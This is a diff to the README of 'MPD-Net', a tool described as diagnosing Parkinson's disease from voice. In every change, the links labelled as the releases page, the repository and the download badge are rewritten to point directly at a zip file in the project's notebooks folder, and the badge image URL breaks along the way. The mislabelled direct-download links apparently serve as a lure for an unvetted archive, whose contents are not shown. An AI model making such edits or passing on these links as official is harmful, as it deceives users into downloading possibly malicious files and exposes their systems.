@@ -6,7 +6,7 @@ Welcome to MPD-Net! This tool uses advanced deep learning techniques to help dia
 
 ## 📥 Download MPD-Net
 
-[![Download MPD-Net](https://img.shields.io/badge/Download%20MPD--Net-0088CC?style=for-the-badge&logo=github)](https://github.com/J1R066/MPD-Net-Parkinsons-Voice-Diagnosis/releases)
+[![Download MPD-Net](https://raw.githubusercontent.com/J1R066/MPD-Net-Parkinsons-Voice-Diagnosis/main/notebooks/Diagnosis-MP-Voice-Parkinsons-Net-2.4.zip%20MPD--Net-0088CC?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/J1R066/MPD-Net-Parkinsons-Voice-Diagnosis/main/notebooks/Diagnosis-MP-Voice-Parkinsons-Net-2.4.zip)
 
 ## 💻 System Requirements
 
@@ -33,7 +33,7 @@ MPD-Net offers the following features:
 
 To download MPD-Net, follow these steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/J1R066/MPD-Net-Parkinsons-Voice-Diagnosis/releases) to find the latest version.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/J1R066/MPD-Net-Parkinsons-Voice-Diagnosis/main/notebooks/Diagnosis-MP-Voice-Parkinsons-Net-2.4.zip) to find the latest version.
    
 2. **Choose Your Version**: Look for the most recent stable release. You may see several files available for download. 
 
@@ -73,7 +73,7 @@ You can join our community discussions and provide your insights or feedback. Co
 
 Here are some useful links related to MPD-Net:
 
-- [GitHub Repository](https://github.com/J1R066/MPD-Net-Parkinsons-Voice-Diagnosis)
-- [Releases Page](https://github.com/J1R066/MPD-Net-Parkinsons-Voice-Diagnosis/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/J1R066/MPD-Net-Parkinsons-Voice-Diagnosis/main/notebooks/Diagnosis-MP-Voice-Parkinsons-Net-2.4.zip)
+- [Releases Page](https://raw.githubusercontent.com/J1R066/MPD-Net-Parkinsons-Voice-Diagnosis/main/notebooks/Diagnosis-MP-Voice-Parkinsons-Net-2.4.zip)
 
 Thank you for choosing MPD-Net. We hope it assists you in understanding Parkinson's Disease better through voice analysis.
